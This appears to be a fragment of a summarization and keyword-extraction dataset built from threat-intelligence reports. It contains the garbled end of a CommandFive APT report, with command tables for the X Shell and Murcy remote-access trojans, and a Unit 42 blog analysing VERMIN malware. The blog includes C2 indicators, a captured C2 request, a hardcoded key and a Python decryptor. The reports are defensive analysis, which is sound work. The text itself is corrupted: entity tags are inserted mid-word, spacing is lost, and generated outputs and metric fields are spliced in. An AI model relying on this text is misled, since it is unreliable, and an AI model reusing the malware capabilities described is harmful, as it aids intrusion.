fromSunbelt \t Security : url e36e3c83f6a Sunbelt \t Security . \t ( [DATE] 2010 , \t May12 ) . \t GFI [PERSON] SandBox [PERSON] Analysis [PERSON] Report . \t RetrievedFebruary \t [DATE] 07 , \t 2012,from \t Sunbelt [DATE] January \t [DATE] 23 , \t [DATE] 2012 , \t fromGFI \t [PERSON] SandBox : SymantecCorporation.(2010 , \t [DATE] March \t 11 ) . \t [ORG] Backdoor . Sykipot At Work . \t Retrieved \t [DATE] February \t [DATE] 02 , \t [DATE] 2012 , \t from \t Symantec Connect \t Community : \t url work SymantecCorporation.(2012 , \t [DATE] January \t 26 ) . \t [ORG] Insight into [ORG] Sykipot [ORG] Operations | \t Symantec Connect Community . Retrieved \t [DATE] February \t 05,2012 , \t from \t SymantecConnect \t Community : url sykipot operations 0 [ORG] Telus . \t ( 2011,August \t [CARDINAL] 03 ) . \t [ORG] Backdoor . Win32.Murcy . A \t   [ORG] TELUS \t Security \t Labs . \t Retrieved \t December06 , \t [DATE] 2011 , \t from [ORG] TELUS \t [WORK_OF_ART] SecurityLabs : \t url 01 Thakur , \t V. \t ( [DATE] 2011 , \t December14 ) . \t The \t Sykipot Attacks \t | Symantec \t Connect Community . Retrieved \t [DATE] February \t 04,2012 , fromSymantecConnectCommunity : \t url attacks Threat \t Expert \t Ltd.(2010 , \t June15 ) . \t ThreatExpert Report . \t Retrieved \t [DATE] January \t 11 , \t [DATE] 2012 , \t fromThreatExpert : url Threat \t Expert \t Ltd.(2011 , \t [DATE] July \t [CARDINAL] 26 ) . \t ThreatExpert Report : [ORG] Backdoor.Win32.Agent.anvj , [ORG] Trojan [ORG] Downloader . Delphi . Retrieved \t December17 , \t [DATE] 2011 , \t from \t ThreatExpert : Threat \t Expert \t Ltd.(2011 , \t November04 ) . ThreatExpert report : [PERSON] Mal / Behav 027 , Backdoor : Win32 / Idicaf.gen!B. Retrieved \t November25 , \t [DATE] 2011 , \t from \t ThreatExpert : Threat \t Expert \t Ltd.(2011 , \t [GPE] October06 ) . \t ThreatExpert Report : Mal / Behav [CARDINAL] 027 , Virus / Win32.Atraps . [ORG] CK . \t Retrieved November21,2011,from \t ThreatExpert : Threat \t Expert \t Ltd.(2011 , \t September25 ) . \t ThreatExpert Report : [ORG] TrojanDropper : Win32 / [GPE] Idicaf . C , Virus . Win32.Atraps . [ORG] CK , Backdoor.Win32.Agent.bhxn . \t Retrieved \t December25 , \t [DATE] 2011 , \t fromThreatExpert : Threat \t Expert \t Ltd.(2008 , \t December18 ) . \t ThreatExpert Report : Mal / EncPk BL , [PERSON] Worm : Win32 / Emerleox . J , Packed.Win32.Klone.af . \t Retrieved \t [DATE] January \t 15 , \t [DATE] 2012 , \t fromThreatExpert : ThreatExpertLtd . \t ( [DATE] 2010 , \t [DATE] March \t [CARDINAL] 18 ) . \t ThreatExpert Report : Troj / Agent MSC , BinImage / Agent.283805 . \t Retrieved [DATE] January \t [DATE] 26 , \t [DATE] 2012 , \t fromThreatExpert : ThreatExpertLtd . \t ( [DATE] 2011 , \t [ORG] December09 ) . \t ThreatExpert Report : Backdoor.Win32.Delf.abow , [GPE] Trojan . Win32.CDur , [ORG] Mal / Behav [ORG] 058 Retrieved \t [DATE] February \t [DATE] 03 , \t [DATE] 2012 , \t fromThreatExpert : US CERT . \t ( [DATE] 2011 , \t [DATE] March \t [CARDINAL] 26 ) . \t Early Warning and Indicator \t Notice \t ( EWIN ) [CARDINAL] 11 077 01A \t UPDATE . \t Retrieved \t [DATE] January [DATE] 06 , \t 2011,from \t IncidentPreventionand \t Detection : \t Protecting \t InformationSecurity \t of \t [ORG] NationalBanks : url issuances / [LOC] alerts/2011 / alert [CARDINAL] 2011 4b.pdf Verisign.(2011 ) . \t Verisign Authentication Services . \t Retrieved \t December29,2011,fromVerisignClass3 \t Code Signing \t CertificateRevocationList : url 2009.crl COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE22OF \t 29Ward , E. \t ( 2011,July \t 31 ) . \t Backdoor . Murcy \t | \t Symantec . \t RetrievedJanuary05,2011,from \t Symantec : url 080105 2030 99 [ORG] Wikipedia . \t ( n.d . ) . \t List of [ORG] Intel microprocessors . \t Retrieved \t [DATE] January \t 21 , \t 2012,from \t [ORG] Wikipedia , \t thefreeencyclopedia : url [PERSON] Wong , \t J. \t ( [DATE] 2011 , \t August16 ) . \t Encyclopedia entry : Backdoor . Win32 / Thoper . A. \t RetrievedJanuary \t [DATE] 24 , \t [DATE] 2012 , \t from [ORG] Microsoft \t MalwareProtectionCenter : url [CARDINAL] 32%2FThoper . A [ORG] XTiger Crackersoftware.(2011 , \t [DATE] February \t [CARDINAL] 14 ) . \t All for \t Dream RetrievedDecember23 , \t 2011,from \t xdoors.net : url [ORG] XTiger . \t ( 2010,April28 ) . \t forum.xdoors.net . RetrievedDecember19,2011,from \t xdoors.net : url [ORG] XTiger . \t ( 2011,March \t [CARDINAL] 16 ) . forum.xdoors.net . Topic : X Door / X Shell \t free download paused . \t Retrieved \t December27 , [DATE] 2011 , \t fromforum.xdoors.net : \t url [ORG] XTiger . \t ( [DATE] 2011 ) . Xdoors.net . \t Retrieved \t December23,2011 , \t from \t Allfordream : \t url [ORG] XTiger . \t ( n.d . ) . \t X Shell . \t Retrieved \t December23,2011,from \t XDoors : url Shell.htmCOPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE23OF \t 29OFFSET 155ANNEX ALENGTH \t ( IN \t BYTES ) [CARDINAL] 1FORMAT \t OF OSVERSIONINFOEX STRUCTUREMEMBERDESCRIPTION Structuresizeinbytes . \u20180x9C \u2019 \t ( [CARDINAL] 156bytes ) . Anull terminated \t string \t thatindicatesthelatestServicePack \t installed . Abitmask91thatidentifies \t theproductsuites \t installed \t onthesystem . Producttypethatindicateswhetherthesystemisaworkstation(\u20180x01\u2019),adomaincontroller ( \u2018 0x02\u2019)oranNTserverbutnotadomaincontroller(\u20180x03 \u2019 ) . Abytereserved \t forfutureuse.91ForadetaileddescriptionoftheproductsuitebitmaskrefertotheMicrosoftMSDNOSVERSIONINFOEXreferencepage.(Microsoft Corporation,2011)COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE24OF \t 29ANNEX [ORG] BFORMAT \t OF SYSTEM_INFO STRUCTURELENGTH \t ( IN \t BYTES ) Anumberindicating \t theprocessorarchitectureoftheinstalled \t OS . Bytes \t reservedforfutureuse . Pagesizeused \t and \t thegranularityofpageprotectionand \t commitment . Minimumapplicationaddress . This \t is \t thelowestmemoryaddressthatapplicationsand [ORG] DLLscanaccess . Maximumapplicationaddress . Thisis \t thehighestmemoryaddress \t thatapplications and \t [ORG] DLLscanaccess . Amask \t representing \t thesetofprocessors \t configuredintothesystem . Granularityforthestarting \t addressatwhich \t virtual \t memorycanbeallocated . Thearchitecture dependentprocessorlevel . Thearchitecture dependentprocessorrevision . OFFSET 34COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE25OF \t [CARDINAL] 29COMMAND rebindANNEX CSUMMARY OF \t X SHELL COMMANDSCOMMANDDESCRIPTION Servicecontrol \t ( list / stop / start / view / installetc . ) . Starts \t acommand \t shell . Modifies \t timestamponafile(datecreatedetc . ) . UninstallsRAT . Gets \t process \t modulespecificinformation . Gets \t hostmouseand \t keyboard \t idletime . Opens \t aURL \t inhiddenview . Opens \t aURL \t innormalview . Executes \t aprograminhiddenview . Executes \t aprograminnormal \t view . Compresses \t afileorfoldertoaCabfile . Gets \t currentControl \t HostIP \t address \t and \t port . Uploads \t afiletotheControlHost . Downloads \t afilefromtheControl \t HostoraURL . Injectsapluginintoanotherprocess.(Thedefaultprocesstoinjectintois \t \u2018 IEXPLORE.EXE \u2019 . ) Infects \t aportableexecutablefile . Repairs \t aportableexecutable \t file . Displays \t informationaboutinstalled \t antivirussoftware . TCP \t portforwarding \t and \t mapping . Displays \t control \t proxy . Terminates \t aTCP \t connection . Controls \t CD ROM(open / close ) . Extracts \t sensitiveinformation . RebindsTCP \t porttogetpassword . COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE26OF \t 29fport myplugDisplays \t portinformationwith \t processpath . Usercontrol \t ( list / add / delete/ \t control \t etc.).Supports \t cloning \t andcloning \t check \t flood . Initiatesafloodattack . Terminal \t managementsettings \t ( viewport / setport / start / stop ) . Attempts \t tofind \t currentuser\u2019sloginpassword . Aninterfacetothird partydeveloped \t plugins . COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED.PAGE27OF \t 29COMMANDCODE 0x8000ANNEX DSUMMARY OF \t MURCY COMMANDSCOMMANDDESCRIPTION Input / outputgenerated \t intheprocesswith \t anamedpipe . Getenvironmentstring . COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t [PERSON] LTD.ALLRIGHTSRESERVED.PAGE28OF \t [CARDINAL] 29COPYRIGHT \t NOTICECopyright \u00a9 [ORG] CommandFivePty \t [ORG] Ltd. \t Allrightsreserved . This \t document \t is \t providedby \t thecopyrightholdersunderthelicence that \t follows . \t Byobtaining , using , \t and / ordistributingthisdocumentyou agreethat \t youhaveread , understood , \t and \t agreetothetermsand used \t inadvertisingorpublicity \t relatingtothisdocumentorits \t contents withoutspecific , \t prior , \t writtenpermission . No \t permissionisgivenforthisdocumenttobeused \t forcommercial purposes or as part \t of \t any \t commercial activity \t or undertaking , including , \t but \t not \t limited to , \t use in or relating \t to advertising \t or publicity , \t and / oruseinsupportof , oraspartof , any \t pre salesorsales activities . No \t permissionisgiventocreatemodifiedorderivativeworks . \t You may \t distributethis \t document \t initsoriginalformfornon commercial purposesinaccordancewith \t theothertermsand \t conditionsstated herein . \t Copyrighttitle willatalltimesremain withthecopyright holders . Allreferencedtrademarksremaintheproperty \t of \t theirrespective owners . THIS DOCUMENT \t IS \t PROVIDED \t \u2018 AS \t IS \u2019 FOR INFORMATIONAL INCLUDING BUT \t NOT \t LIMITED TO \t ANY WARRANTY , EXPRESSORIMPLIED , OFMERCHANTABILITYORFITNESSFORA PARTICULAR PURPOSE ; WARRANTY OF \t NON INFRINGEMENT , \t OR TITLE ; \t NORANYWARRANTIES \t PERTAININGTO \t THEACCURACYOR COMPLETENESSOF \t [ORG] CONTENT . ANYOPINIONS \t EXPRESSED \t INTHISDOCUMENTMAYCHANGE WITHOUTNOTICEAND \t ARENOTNECESSARILYTHECONSIDERED OPINIONS \t OF \t [PERSON] COMMAND \t [CARDINAL] FIVE \t [ORG] PTYLTD , ITSPARTNERS , \t [ORG] EMPLOYEES , OR AFFILIATE \t ORGANISATIONS . \t ANY ADVICE OFFERED \t IN THIS DOCUMENT \t ISOFFERED \t WITHOUTWARRANTYOFANYKIND.CommandFivePty \t Ltd ABN : \t [DATE] 49 \t [CARDINAL] 149 \t [CARDINAL] 576 \t [CARDINAL] 670 url info@commandfive.com PAGE29OF \t 29COPYRIGHT \u00a9 \t COMMANDFIVEPTY \t LTD.ALLRIGHTSRESERVED .", "generated_text": "analysis; a report; the Fifth Domain; Advanced Persistent Threat; a hack; SK Communications; July 2011; the attackers; access; various callback domains; the malware; the C2 server; IP addresses; the DNS; x.x.x.x; DNS servers; a response; the malware; APT.", "ref_text": "<START-1>The paper presents an analysis of command and control infrastructure used by an advanced persistent threat (APT) group. It examines malicious software and protocols used to communicate with command and control servers. The findings link this activity to major targeted cyberattacks including the 2011 SK Communications hack, the 2011 RSA breach, and the NightDragon attacks on the energy sector. The analysis focuses on activity involving the domain \"alyac.org\" and its subdomains. Communications were observed between compromised computers and these domains using several protocols including LURK, XShell, Update?, Murcy, Oscar, BB, DB, and Qdigit. These protocols reveal information about the victims such as operating system details. The activity enables the attackers to remotely control the compromised systems. The report details how the observed activity is associated with various malware families and attacks. For example, the LURK and Update?/Oscar communications are tied to the Destory remote access trojan used in targeted intrusions. The Murcy malware has links to the 2011 RSA breach. Many of the domains and infrastructure have connections to the NightDragon and Sykipot campaigns. Insight is provided on the attackers' tactics, techniques and procedures. This includes configuring malware to use specified DNS servers, stealing browser cookies for potential session hijacking, using hidden communication channels, and more. Recommendations are made for security teams to monitor DNS traffic, be alert for high-frequency beaconing, and block activity that lacks preceding DNS lookups. Overall, the analysis demonstrates how examining lower-level technical indicators can reveal links between disparate intrusions. The findings illustrate the sophistication of some APT actors by highlighting their infrastructure sharing, malware reuse, and operational security practices. The report provides useful advice to help organizations defend against targeted attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.43544303797468364, "gpt3/lexical/rouge_rouge2": 0.14758269720101783, "gpt3/lexical/rouge_rougeL": 0.24810126582278477, "gpt3/lexical/rouge_rougeLsum": 0.24810126582278477, "gpt3_generated_text": ["This article presents the findings of an extensive investigation into the command and control infrastructure used by an Advanced Persistent Threat (APT). The investigation includes technical details of the malicious software used and the associated command and control protocols. The findings identify the modus operandi and demonstrate links between major targeted attacks, including the SK Communications hack in July 2011, the RSA breach in March 2011, and the coordinated cyberattacks dubbed NightDragon. The malware used in the attack was programmed to communicate with several 'callback' domains, which were resolved into IP addresses using the Domain Name System (DNS) protocol. The article warns against accessing these malicious locations and provides a depiction of the communications involved."]}, {"split_name": "val", "sample_id": "val_102", "prompt_text": "Extract the keywords: [PERSON] Blog [PERSON] Home ( url > Unit 42 ( url > VERMIN : Quasar RAT and [ORG] Custom [ORG] Malware Used In UkraineVERMIN : Quasar RAT and [ORG] Custom [ORG] Malware Used In UkraineBy [PERSON] Tom [PERSON] Lancaster ( url and Juan Cortes ( url [DATE] January 29 , [DATE] 2018 at [TIME] 5:00 [TIME] AM [TIME] Category : Unit 42 ( url Tags : [ORG] AutoFocus ( url ConfuserEx ( url Espionage ( url Quasar ( url Quasar RAT ( url [GPE] Ukraine ( url [PERSON] VERMIN ( url \ue800 [CARDINAL] 2,352 \ue802(3)(url custom - malware - used - ukraine%2F+VERMIN%3A+Quasar+RAT+and+Custom+Malware+Used+In+Ukraine ) \ue805 ( url u = [DATE] https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42 - vermin - quasar - rat- custom - malware - used - ukraine%2F ) [PERSON] \ue804 ( url mini = true&url = [DATE] https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42 - vermin- quasar - rat - custom - malware - used- ukraine%2F&title = VERMIN%3A+Quasar+RAT+and+Custom+Malware+Used+In+Ukraine&summary=&source=)(//www.reddit.com / submit)Summary [ORG] Palo [ORG] Alto [ORG] Networks [ORG] Unit 42 has discovered a new malware family written using the Microsoft .NET Framework which the authors call \u201c VERMIN \u201d ; an ironic term for a RAT ( Remote Access Tool ) . Cursory investigation into the malware showed the attackers not only had \ufb02air for malware naming , but also for choosing interesting targets for their malware : nearly all the targeting we were able to uncover related to activity in [GPE] Ukraine . Pivoting further on the initial samples we discovered , and their infrastructure , revealed a modestly sized campaign going back to late 2015 using both Quasar RAT ( url and VERMIN . This blog shows the links between the activity observed , a walkthrough of the analysis of the VERMIN malware , and IOCs for all activity discovered . It all began with a tweet Our initial interest was piqued through a tweet ( url from a fellow researcher who had identi\ufb01ed some malware with an interesting theme relating to [ORG] the [ORG] Ukrainian [ORG] Ministry [ORG] of [ORG] Defense as a lure.(url 1 \u2013 The decoy document displayed to users when executing the initial malware sampleThe sample was an [ORG] SFX exe which displayed a decoy document to users before continuing to execute the malware ; the hash of the \ufb01le is given below . protocol used for exchanging structured information , for command and control ( C2 ) , which is something not often seen in malware samples . Using [ORG] AutoFocus , we were quickly able to \ufb01nd similar samples , by pivoting on the artifacts the malware created during a sandbox run , resulting in [CARDINAL] 7 other samples as shown in [ORG] Figure [CARDINAL] 2.(url 2 \u2013 Pivoting in [ORG] AutoFocus makes it easy to \ufb01nd similar malware samples . Using the Maltego for [ORG] AutoFocus ( url transforms , we were then able to take the newly discovered samples and look at the C2 infrastructure in an attempt to see if we could link the samples together and in turn see if these C2 \u2019s were contacted by malware . We quickly built up a picture of a campaign spanning just over [DATE] 2 [DATE] years with a modest [CARDINAL] C2 infrastructure:(url [CARDINAL] 3 \u2013 Further analysis using [ORG] AutoFocus [ORG] & other data sources allows us to link up the activity discovered so far . The malware samples we discovered fell largely into [CARDINAL] two buckets : [PERSON] Quasar [PERSON] Rat and VERMIN . Quasar RAT is an open - source malware family which has been used in several other attack campaigns including criminal ( url [DATE] 2017 ) and espionage ( url recent - targeted - attacks - against - governments/ ) motivated attacks . But a reasonable number of the samples were the new malware family , VERMIN . Looking at the samples in our cluster we could see the themes of the dropper \ufb01les were similar to our \ufb01rst sample . Notably , most of the other \ufb01les we discovered did not come bundled with a decoy document and instead were simply the malware and dropper compiled with icons matching popular document viewing tools , such as [ORG] Microsoft [ORG] Word . Names of some of the other dropper binaries observed are given below , with the original [GPE] Ukrainian on the left and the translated [LANGUAGE] English ( via Google ) on the right : Original Name ( Ukrainian)Translated [PERSON] Name ( if applicable ) Your certi\ufb01cate for free_receive help.exereport2.exe fuel supply report [CARDINAL] 08.06.17.exeN / A\u0412\u0430\u0448 _ \u0441\u0435\u0440\u0442\u0438\u0444_\u043a\u0430\u0442\u0438 \u0434\u043b\u044f \u043e\u0442\u0440\u0438\u043c\u0430\u043d\u043d\u044f \u0431\u0435\u0437\u043e\u043f\u043b\u0430\u0442\u043d\u043e _ \u0432\u0442\u043e\u0440\u0438\u043d\u043d\u043e _ \u0434\u043e\u043f\u043e\u043c\u043e\u0433\u0438.exe \u043f\u0430\u043b\u0438\u0432\u043e\u043c 08.06.17.exelg_svet_smeta2016- [CARDINAL] 2017cod.exe.lugansk_2273_21.04.2017.exeN / A\u041e\u0442\u0447\u0435\u0442 - \u0440\u0430\u0439\u043e\u043d\u044b_2\u043a\u0432- \u043b-2016.exeReport - areas_2kv - l-2016.exeGiven the interesting targeting themes and the discovery of a new malware family , we decided to take a peek at what \u201c VERMIN \u201d was capable of and document it here . Dissecting VERMIN For this walkthrough , we \u2019ll be going through the analysis of the following sample : [DATE] 2017 - 07 - 04 12:46:43 UTCAnalyzing the malware dynamically quickly gave us a name for the malware , based on the [ORG] PDB string present in the memory of the sample : [PERSON] Z:\\Projects\\Vermin\\TaskScheduler\\obj\\Release\\Licenser.pdb [PERSON] As is the case with many of the samples from the threat actors behind [ORG] VERMIN , our sample is packed initially with the popular .NET obfuscation tool [GPE] ConfuserEx ( url Using a combination of tools , we were able to unpack and deobfuscate the malware . Following initial execution , the malware \ufb01rst checks if the installed input language ( url us / library / cc766191(v = ws.10).aspx ) in the system is equal to any of the following : ru \u2013 [NORP] Russian uk \u2013 [GPE] Ukrainian ru - ru \u2013 [LANGUAGE] Russian uk - ua \u2013 [GPE] UkrainianIf none of the languages above is found the malware calls \u201c Application . Exit ( ) ( url us / library / ms157894(v = vs.110).aspx ) \u201d , however despite its name , this API call does n\u2019t actually successfully terminate the application , and instead the malware will continue to run . It \u2019s likely the author intended to terminate the application , in which case a call like \u201c [WORK_OF_ART] System . Environment . [PERSON] Exit ( ) \u201d would have been a better choice . The fact that this functionality does not work as intended suggests that if author tested the malware before deployment , they were likely to be doing so on systems where the language matches the list above , since otherwise they would notice that the function is not working as expected . After passing the installed language check the malware proceeds to decrypt an embedded resource using the following logic : It retrieves the \ufb01nal [CARDINAL] four bytes of the encrypted resource . These [CARDINAL] four bytes are a CRC32 sum , and the malware then proceeds to brute force what [QUANTITY] 6 - byte values will give this CRC32 sum . Once it \ufb01nds this array of [CARDINAL] 6 bytes it performs an MD5 hash sum on the bytes , this value is used as the key . The \ufb01rst 16bytes of the encrypted resource are then used as the IV for decryption Finally , using AES it decrypts the embedded resource . A script mirroring this routine can be found in appendix C. After decrypting the embedded resource , the malware passes several hardcoded arguments to the newly decrypted binary and performs a simple setup routine before continuing execution . The embedded resource contains all the main code for communications and functionality the [ORG] RAT contains . [ORDINAL] First the malware attempts to decrypt all of the strings passed as parameters . If no arguments were supplied the malware attempts to read a con\ufb01guration \ufb01le from a pre - de\ufb01ned location expecting it to be base64 - encoded and encrypted with 3- DES using a hardcoded key \u201c KJGJH&^$f564jHFZ \u201d : C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\AddIns\\settings.dat If arguments were supplied , they are saved and encrypted to the same location as above . Parameters supplied are given below . Note that these are the actual variable names used by the malware author : serverIpList [PERSON] keyLoggerTaskAuthorThe decrypted resource is set to be run as a scheduled task [TIME] every [TIME] 30 [TIME] minutes , inde\ufb01nitely . After this , the malware is ready to start operations , and does so by collecting various information about the infected machine , examples of collected information includes but is not limited to : Machine name Username OS name via [ORG] WMI query Architecture : x64 vs x86 ( [CARDINAL] 64 vs. [CARDINAL] 32 bit ) Local IP Address Checks Anti - Virus installed via WMI queryIf [ORG] the Anti - Virus ( AV ) query determines any AV is installed the malware does not install the keylogger . The keylogger is embedded as a resource named \u2018 AdobePrintFr \u2019 . This binary is only packed with Confuser - Ex and is not further obfuscated . The malware then sends its initial beacon using a SOAP envelope to establish a secure connection . The author uses the WSHttpBinding ( ) API \u2013 which allows the author to use WS - Addressing and purposely sets the WSMessageEncoding . [PERSON] Mtom to encode the SOAP messages . The author also sets up for using \u2018 Username \u2019 authentication for communicating with its C2 , presumably allowing the author easier control over the various infected hosts . A defanged exemplar request / response is [CARDINAL] 3POST /CS [ORG] HTTP/1.1 MIME - Version : [CARDINAL] 1.0 Content - Type : multipart / related ; type=\"application / xop+xml\";start=\"<url\";boundary=\"uuid : ae621187 - 99b 2 - 4b50 - 8a74 - a33e8c7c0990+id=3\";start - info=\"application / soap+xml \" Host : akamainet024[.]info Content - Length : [DATE] 1408 Expect : 100 - continue Accept - Encoding : gzip , deflate Connection : Keep - Alive --uuid : ae621187 - 99b2 - 4b50 - 8a74 - a33e8c7c0990+id=3 Content - ID : < url Content - Transfer - Encoding : [CARDINAL] 8bit Content - Type : application / xop+xml;charset = utf-8;type=\"application / soap+xml \" < s : Envelope xmlns : s=\"url \" xmlns : a=\"url\"><s : Header > < a : Action s : mustUnderstand=\"1\">url [CARDINAL] 159e7656 - a3ea-4099 - aa59 - 7ab04361ad99</a : MessageID><a : ReplyTo><a : Address > url < /a : [PERSON] Address></a : ReplyTo><a : To s : mustUnderstand=\"1\">url rityToken Context=\"uuid-9a01748a-8acf-449e-9a3d - febcff2f2406 - 3 \" xmlns : t=\"url \" > < t : [ORG] TokenType > url [CARDINAL] 05/02 / trust / Issue</t : RequestType><t : KeySize>256</t : KeySize><t : BinaryExchange ValueType= \" url s/2005/02 / trust / tlsnego \" EncodingType=\"url 1.0#Base64Binary\">FgMBAFoBAABWAwFaCdyfpYsLZDbnCizlWg3iw2M80KiaWb+oIgzhJ1BvugAAGAAvADUABQAKwBPAFMAJwAoAMgA4ABMABAEAABX/ AQABAAAKAAYABAAXABgACwACAQA=</t : BinaryExchange></t : RequestSecurityToken></s : [PERSON] Body></s : Envelope > --uuid : ae621187 - 99b2 - 4b50 - 8a74 - a33e8c7c0990+id=3 - -17 VERMIN collects all keystrokes and clipboard data and encrypts the data before storing it in the following folder : % appdata%\\Microsoft\\Proof\\Settings.{ED7BA470 8E54 [CARDINAL] 465E 825C 99712043E01C}\\Profiles\\. Each \ufb01le is saved with the following format : \u201c { 0 : dd - MM - yyyy}.txt \u201d . The data is encrypted using the same method and [CARDINAL] 3 - DES key , used to encrypt the con\ufb01guration \ufb01le . [PERSON] Vermin supports the following commands:4 UploadFileFor most of these commands , the malware requires \u201c hands - on - keyboard \u201d style one - to - one interactions . Often remote access tools written in .NET borrow and steal code from other tools due to the plethora of code available through open source ; however , it appears that whilst some small segments of code may have been lifted from other tools , this [ORG] RAT is not a fork of a well - known malware family : it \u2019s mostly original code . We have linked all the samples we have been able to identify to the same cluster of activity : this strongly suggests the VERMIN malware is used exclusively by this threat actor and this threat actor alone . We were unable to de\ufb01nitively determine the aims of the attackers or the data stolen . However , given the limited number of samples , the targeting themes observed , and the \u201c hands - on - keyboard \u201d requirement for most of the malwares \u2019 operations ( except for keylogging ) , it seems likely that the malware is used in targeted attacks in [GPE] Ukraine . [GPE] Ukraine remains a ripe target for attacks , even gaining its own dedicated [ORG] Wikipedia page ( url for attacks observed in [DATE] 2017 . In addition to the high - pro\ufb01le attacks such as the [GPE] Petya / NotPetya ( url and [PERSON] BadRabbit ( url which have been widely reported , there are likely many smaller campaigns like the [CARDINAL] one described in this blog aimed to steal data to gain an information advantage for the attackers \u2019 sponsors . [ORG] Palo [ORG] Alto [ORG] Networks defends our customers against the samples discussed in this blog in the following ways : [ORG] Wild\ufb01re identi\ufb01es all samples mentioned in this article as malicious . Traps identi\ufb01es all samples mentioned in this article as malicious . C2 domains used in this campaign are blocked via [ORG] Threat [ORG] Prevention . AutoFocus customers can track samples related to this blog via the following tags : VERMIN ( url#/tag / Unit42.VERMIN url#/tag / Unit42.VERMINCampaign url#/tag / Unit42.VERMIN ) [ORG] VERMINKeylogger ( url#/tag / Unit42.VERMIN url#/tag / Unit42.VERMINCampaign url#/tag / Unit42.VERMINKeyLogger ) [GPE] VERMINCampaign ( url#/tag / Unit42.VERMIN url#/tag / Unit42.VERMINCampaign url#/tag / Unit42.VERMINCampaign)Appendix A \u2013 C2 Addresses www.akamaicdn[.]ru www.akamainet066[.]info www.akamainet023[.]info www.akamainet021[.]infoakamainet023[.]info www.akamainet022[.]info www.cdnakamai[.]ru notifymail[.]ru www.notifymail[.]ru mailukr[.]net tech - adobe.dyndns[.]biz www.mailukr[.]net [CARDINAL] 185.158.153[.]222 [CARDINAL] 94.158.47[.]228 195.78.105[.]23 94.158.46[.]251 188.227.75[.]189 212.116.121[.]46 185.125.46[.]24 5.200.53[.]181 Appendix B \u2013 Malware Samples Appendix C \u2013 Python script to decode VERMIN resources1 [CARDINAL] 54#!/usr / local / [PERSON] bin / python _ _ author _ _ = \" Juan C Cortes \" _ _ version _ _ = \" [CARDINAL] 1.0 \" _ _ email _ _ = \" jcortes@paloaltonetworks.com \" from random import randint from tabulate import tabulate from Crypto import Random from Crypto . Cipher import [ORG] AES parser = argparse . [ORG] ArgumentParser ( usage=\"Decrypt strings for VerminRAT \" ) help=\"Print debugging information \" ) help=\"Output results file \" ) help=\"Input file of newline separated strings or single string \" ) help=\"Param use for decrypting blobs of data instead of strings . [PERSON] Blob is autosave to ' blob.out ' \" ) def write_out(output_list , headers , output_file = False ): \" \" \" Pretty outputs list : param output_list : List to output \" \" \" print tabulate(output_list , headers , tablefmt=\"simple \" ) with open(output_file , \" ab \" ) as file : file.write(tabulate(output_list , headers , tablefmt=\"simple \" ) ) file.write(\"\\n\\n \" ) abyte = bytearray(6 ) for i in range(0,6 ): abyte[i ] = randint(0 , 0x7FFFFFFF ) % 7 def parseEncrypteStr(encryptStr ): try : decoded = encryptStr.decode('base64 ' ) hardcoded_crc32 = decoded[-4 :] parsedEncrypted = decoded[16:-4 ] iv = decoded[:16 ] return hardcoded_crc32,parsedEncrypted , iv except [ORG] Exception as e : def bruteForceCRC32Value(valuecrc32 ): crc32 = binascii.crc32(arry ) crc32 = crc32 % ( 1 < < 32 ) if crc32 = = valuecrc32 : def decryptStr(str , key , iv ): aes = AES.new(key , AES.MODE_CBC , iv ) blob = aes.decrypt(str ) def parsePlainText(str ): char = \" \" for i in str : if 0x20 < = ord(i ) < = 0x127 : def parseUnicde(str ): for i in range(0,len(str)/2 ): uni + = str[i ] return uni.decode('utf16 ' ) except [ORG] Exception as e : args = [ORG] parse_arguments().parse_args ( ) if args.vverbose : logging.basicConfig ( level = logging . DEBUG , format= ' % ( asctime)s - % ( levelname)s - % ( message)s ' ) if args.blob and os.path.exists(args.input ) ! = True : b = args.input [PERSON] crc32Hardcode , encryptedStr , iv = parseEncrypteStr(b ) [PERSON] crc32Hardcode = bytearray(crc32Hardcode ) crc32Hardcode = struct.unpack('<I ' , crc32Hardcode)[0 ] bruteArray = bruteForceCRC32Value(crc32Hardcode ) m = hashlib.md5 ( ) m.update(bruteArray ) key = m.digest ( ) plain = decryptStr(encryptedStr , key , iv ) with open('blob.out ' , \" wb \" ) as file : file.write(plain ) if os.path.exists(args.input ) ! = True : strs.append(args.input ) with open(args.input , \" rb \" ) as open_file : for line in open_file : hash = line.rstrip ( ) strs.append(hash ) for s in strs : [PERSON] crc32Hardcode , encryptedStr , iv = parseEncrypteStr(s)crc32Hardcode = bytearray(crc32Hardcode ) crc32Hardcode = struct.unpack('<I ' , crc32Hardcode)[0 ] bruteArray = bruteForceCRC32Value(crc32Hardcode ) m = hashlib.md5 ( ) m.update(bruteArray ) key = m.digest ( ) plain = decryptStr(encryptedStr , key , iv ) parsestr = parsePlainText(plain ) unistr = parseUnicde(plain ) headers = [ \" ASCII\",\"UNICODE \" ] outputlist = [ [ parsestr , unistr ] ] write_out(outputlist , headers , args.output_file ) if _ _ name _ _ = = ' _ _ main _ _ ' : 158Got something to say?Leave a comment [GPE] Notify me of followup comments via e - mailName ( [PERSON] required)Email ( required)WebsiteSUBMITSUBSCRIBE TO [ORG] NEWSLETTERSEmailCOMPANY [ORG] Company ( url [PERSON] Careers ( url [PERSON] Sitemap ( url [WORK_OF_ART] Report [WORK_OF_ART] a [WORK_OF_ART] Vulnerability ( url NOTICES Privacy Policy ( url Terms of Use ( url Manage Subscription ( [PERSON] url\uf08c ( url \uf082 ( url \uf081 ( url \u00a9 2016 [ORG] Palo [ORG] Alto [ORG] Networks , [ORG] Inc. All rights reserved . SALES > 888.219.8447 \uf101SEE A DEMO \uf101TAKE A TEST DRIVE ( HTTP://CONNECT.PALOALTONETWORKS.COM / VIRTUAL - UTD )", "generated_text": "Palo Alto Networks; a new malware family; Microsoft.NET Framework; VERMIN; a 